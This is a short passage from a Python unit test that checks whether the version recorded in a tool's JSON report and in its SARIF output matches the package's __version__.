            report = _json.loads(json_path.read_text(encoding="utf-8"))
            sarif = _json.loads(sarif_path.read_text(encoding="utf-8"))

        self.assertEqual(report["meta"]["version"], __version__)
        self.assertEqual(sarif["runs"][0]["tool"]["driver"]["version"], __version__)


if __name__ == "__main__":
    unittest.main()
